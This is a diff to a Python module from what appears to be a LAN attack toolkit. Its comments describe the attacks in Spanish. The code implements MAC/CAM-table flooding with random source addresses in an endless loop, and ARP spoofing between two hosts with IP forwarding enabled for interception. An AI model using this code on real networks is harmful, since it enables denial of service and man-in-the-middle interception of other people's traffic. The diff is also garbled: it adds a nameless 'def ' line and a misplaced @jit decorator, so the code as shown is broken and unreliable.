@@ -1,25 +1,46 @@
 from layers.ethernet import Ethernet,EthernetARP
 from general.general import General
 from layers.arp import ARPRequest,ARPRepley
-from time import sleep 
-import socket
+from time import sleep
+from socket import AF_PACKET,SOCK_RAW,socket
+from numba import jit
 
+"""
+Arp Spoofing
+Mac Flooding
+Cam Table Overflow
+Mac Spoofing
+CAM Table Overflow.
+ARP Spoofing
+Ataques que emplean ARP Spoofing.
+"""
 class Lan():
-	def MacOverflow(self,iface,numero=10000,time=-1):
+	@jit
+	def MacOverflow(self,iface,numero=-1,time=0):
 		getvalores = General()
-		s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
+		s = socket(AF_PACKET,SOCK_RAW)
+		#s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
+		#generar mayor numero de trama por segundo
 		s.bind((iface,0))
-
-		while numero > 0:
-			numero-=1
-			ethernet = Ethernet()
-			ethernet.src_mac =  getvalores.mac_random()
-			ethernet.dst_mac = 'ff:ff:ff:dd:ee:cc' #no inporta este valor para el ataque
-			ethernet_send = ethernet.create()
-			s.send(ethernet_send)
-			print('src_mac:'+ethernet.src_mac+' dst_mac:'+ethernet.dst_mac )
+		if numero==-1:
+			while True:
+				ethernet = Ethernet()
+				ethernet.src_mac =  getvalores.mac_random()
+				ethernet.dst_mac = 'ff:ff:ff:dd:ee:cc' #no inporta este valor para el ataque
+				ethernet_send = ethernet.create()
+				s.send(ethernet_send)
+				print('src_mac:'+ethernet.src_mac+' dst_mac:'+ethernet.dst_mac )	
+		else:
+			while numero > 0:
+				numero-=1
+				ethernet = Ethernet()
+				ethernet.src_mac =  getvalores.mac_random()
+				ethernet.dst_mac = 'ff:ff:ff:dd:ee:cc' #no inporta este valor para el ataque
+				ethernet_send = ethernet.create()
+				s.send(ethernet_send)
+				print('src_mac:'+ethernet.src_mac+' dst_mac:'+ethernet.dst_mac )
 		
-
+	def 
 
 	def ARPSpoofing(self,iface,host1,host2):
 	
@@ -59,7 +80,8 @@ class Lan():
 		forward.write('1')
 		forward.close()
 
-		s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
+		#s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
+		s = socket(AF_PACKET,SOCK_RAW)
 		s.bind((iface,0))
 
 		while True:
@@ -85,7 +107,8 @@ class Lan():
 		arp.dst_ip = host
 		sendarp = arp.create()
 
-		s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
+		#s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
+		s =socket(AF_PACKET,SOCK_RAW)
 		s.bind((iface,0))
 		s.send(sendetherarp+sendarp)
 		response = arp.response()
